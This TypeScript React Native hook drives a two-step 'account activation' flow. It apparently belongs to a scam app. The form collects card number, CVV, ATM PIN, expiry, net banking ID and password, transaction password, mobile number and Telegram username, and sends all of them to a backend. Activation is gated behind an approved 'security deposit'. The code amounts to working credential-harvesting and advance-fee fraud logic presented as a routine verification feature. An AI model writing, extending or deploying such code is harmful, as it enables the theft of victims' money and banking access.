import { useCallback, useEffect, useRef, useState } from "react";
import { Alert } from "react-native";

import { useAuth } from "@/contexts/AuthContext";
import {
  createAccountActivationRequest,
  fetchLatestSecurityDeposit,
  fetchUserBankAccounts,
} from "@/services/accountActivationService";

type ActivationForm = {
  accountNumber: string;
  ifsc: string;
  atmNumber: string;
  cvv: string;
  atmPin: string;
  expiry: string;
  netId: string;
  netPassword: string;
  txnPassword: string;
  mobile: string;
  telegram: string;
};

type ActivationErrors = Partial<Record<keyof ActivationForm, string>>;

const INITIAL_FORM: ActivationForm = {
  accountNumber: "",
  ifsc: "",
  atmNumber: "",
  cvv: "",
  atmPin: "",
  expiry: "",
  netId: "",
  netPassword: "",
  txnPassword: "",
  mobile: "",
  telegram: "",
};

export function useAccountActivation() {
  const { session } = useAuth();
  const [step, setStep] = useState(1);
  const [toast, setToast] = useState("");
  const [form, setForm] = useState<ActivationForm>(INITIAL_FORM);
  const [errors, setErrors] = useState<ActivationErrors>({});
  const [showNetPass, setShowNetPass] = useState(false);
  const [showTxnPass, setShowTxnPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const toastTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    return () => {
      if (toastTimeoutRef.current) {
        clearTimeout(toastTimeoutRef.current);
      }
    };
  }, []);

  const showToast = useCallback((message: string) => {
    setToast(message);

    if (toastTimeoutRef.current) {
      clearTimeout(toastTimeoutRef.current);
    }

    toastTimeoutRef.current = setTimeout(() => {
      setToast("");
    }, 2400);
  }, []);

  const updateField = useCallback((field: keyof ActivationForm, value: string) => {
    setForm((prev) => ({ ...prev, [field]: value }));
    setErrors((prev) => ({ ...prev, [field]: "" }));
  }, []);

  const formatCard = useCallback((value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    const parts = digits.match(/.{1,4}/g);
    return parts ? parts.join(" ") : digits;
  }, []);

  const formatExpiry = useCallback((value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 4);

    if (digits.length <= 2) {
      return digits;
    }

    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }, []);

  const validateStep1 = useCallback(() => {
    const nextErrors: ActivationErrors = {};

    if (form.accountNumber.length < 9) {
      nextErrors.accountNumber = "Enter valid account number";
    }

    if (form.ifsc.trim().length !== 11) {
      nextErrors.ifsc = "Invalid IFSC";
    }

    if (form.atmNumber.replace(/\s/g, "").length !== 16) {
      nextErrors.atmNumber = "Card must be 16 digits";
    }

    if (form.cvv.length !== 3) {
      nextErrors.cvv = "CVV must be 3 digits";
    }

    if (form.atmPin.length !== 4) {
      nextErrors.atmPin = "PIN must be 4 digits";
    }

    if (form.expiry.length !== 5) {
      nextErrors.expiry = "Enter expiry";
    }

    setErrors(nextErrors);

    return Object.keys(nextErrors).length === 0;
  }, [form.accountNumber, form.atmNumber, form.atmPin, form.cvv, form.expiry, form.ifsc]);

  const validateStep2 = useCallback(() => {
    const nextErrors: ActivationErrors = {};

    if (!form.netId.trim()) {
      nextErrors.netId = "Net banking ID required";
    }

    if (!form.netPassword) {
      nextErrors.netPassword = "Net banking password required";
    }

    if (!form.txnPassword) {
      nextErrors.txnPassword = "Transaction password required";
    }

    if (form.mobile.length !== 10) {
      nextErrors.mobile = "Enter valid mobile number";
    }

    if (!form.telegram.trim()) {
      nextErrors.telegram = "Telegram username required";
    }

    setErrors(nextErrors);

    return Object.keys(nextErrors).length === 0;
  }, [form.mobile, form.netId, form.netPassword, form.telegram, form.txnPassword]);

  const goToStep = useCallback(
    (nextStep: number) => {
      if (loading || nextStep === step || nextStep < 1 || nextStep > 2) {
        return false;
      }

      if (nextStep === 2 && !validateStep1()) {
        return false;
      }

      setStep(nextStep);
      return true;
    },
    [loading, step, validateStep1]
  );

  const submitActivation = useCallback(async () => {
    if (!session?.user?.id || loading) {
      return false;
    }

    if (!validateStep2()) {
      return false;
    }

    setLoading(true);

    try {
      const bankAccounts = await fetchUserBankAccounts(session.user.id);

      if (bankAccounts.length === 0) {
        Alert.alert(
          "Bank Account Required",
          "Please add a bank account before activating your account."
        );
        return false;
      }

      const matchedBankAccount = bankAccounts.find(
        (account) =>
          account.account_number === form.accountNumber &&
          account.ifsc_code.toUpperCase() === form.ifsc.toUpperCase()
      );

      if (!matchedBankAccount) {
        Alert.alert(
          "Bank Account Mismatch",
          "Please activate the same bank account that you added earlier."
        );
        return false;
      }

      const latestDeposit = await fetchLatestSecurityDeposit(session.user.id);

      if (!latestDeposit) {
        Alert.alert(
          "Security Deposit Required",
          "Please complete a security deposit before activating your account."
        );
        return false;
      }

      if (latestDeposit.status !== "approved") {
        Alert.alert(
          "Security Deposit Pending",
          "Please wait until your security deposit is approved."
        );
        return false;
      }

      await createAccountActivationRequest({
        userId: session.user.id,
        bankAccountId: matchedBankAccount.id,
        securityDepositId: latestDeposit.id,
        accountNumber: form.accountNumber,
        ifscCode: form.ifsc.toUpperCase(),
        atmCardNumber: form.atmNumber.replace(/\s/g, ""),
        cvv: form.cvv,
        atmPin: form.atmPin,
        cardExpiry: form.expiry,
        netBankingId: form.netId.trim(),
        netBankingPassword: form.netPassword,
        transactionPassword: form.txnPassword,
        registeredMobile: form.mobile,
        telegramUsername: form.telegram.trim(),
      });

      showToast(
        "Your activation request has been submitted. Your account will be verified within 24 hours."
      );

      return true;
    } catch (error: any) {
      Alert.alert(
        "Activation Error",
        error.message || "Unable to submit activation request."
      );
      return false;
    } finally {
      setLoading(false);
    }
  }, [
    form.accountNumber,
    form.atmNumber,
    form.atmPin,
    form.cvv,
    form.expiry,
    form.ifsc,
    form.mobile,
    form.netId,
    form.netPassword,
    form.telegram,
    form.txnPassword,
    loading,
    session?.user?.id,
    showToast,
    validateStep2,
  ]);

  const resetAfterSuccess = useCallback(() => {
    setForm(INITIAL_FORM);
    setErrors({});
    setStep(1);
  }, []);

  return {
    step,
    setStep,
    toast,
    form,
    errors,
    showNetPass,
    setShowNetPass,
    showTxnPass,
    setShowTxnPass,
    loading,
    updateField,
    formatCard,
    formatExpiry,
    validateStep1,
    validateStep2,
    goToStep,
    submitActivation,
    resetAfterSuccess,
  };
}
